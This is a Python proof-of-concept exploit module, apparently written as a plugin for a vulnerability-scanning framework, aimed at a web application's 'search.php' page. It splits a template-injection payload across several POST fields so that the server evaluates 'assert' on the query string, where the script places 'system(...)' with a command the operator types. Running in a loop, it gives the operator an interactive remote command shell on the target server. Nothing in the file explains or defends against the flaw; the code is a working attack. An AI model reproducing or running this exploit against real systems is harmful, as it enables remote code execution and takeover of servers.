from lib.core.data import target
import requests
import re

def poc():
	try:
		if  not target.url.endswith("search.php"):
			print("[*] Please make sure the url end with 'search.php'")
			exit()

		while 1:
			try:
				command = raw_input("[*] input the command:")
				if command != "exit":
					url = target.url + "?system(%s)" % command
					postData = {
						"searchtype":"5",
						"searchword":"{if{searchpage:year}",
						"year":":as{searchpage:area}}",
						"area":"s{searchpage:letter}",
						"letter":"ert{searchpage:lang}",
						"yuyan":"($_SE{searchpage:jq}",
						"jq":"RVER{searchpage:ver}",
						"ver":"[QUERY_STRING]));/*"
					}

					r = requests.post(url,data=postData)
					print(r.text[:r.text.find("<!DOCTYPE html>")].encode(r.encoding))
				else:
					break
			except EOFError as e:
				print("[*] type 'exit' to quit")
				pass
	except KeyError as e:
		print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
